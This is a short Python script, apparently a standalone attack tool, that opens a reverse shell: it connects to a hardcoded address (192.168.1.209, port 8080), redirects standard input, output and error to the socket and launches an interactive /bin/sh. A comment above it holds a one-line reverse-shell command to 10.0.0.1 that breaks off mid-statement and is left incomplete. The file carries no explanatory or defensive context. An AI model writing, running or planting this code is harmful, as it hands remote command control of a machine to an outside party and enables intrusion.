import socket
import time
import os
import subprocess
#from future import print_function

# python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=;'


IP = "192.168.1.209"
PORT = 8080

try:
    s = socket.socket()
    s.connect((IP, int(PORT)))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)

    subprocess.call(["/bin/sh", "-i"])

except Exception as E:
    print("Error: ", E)
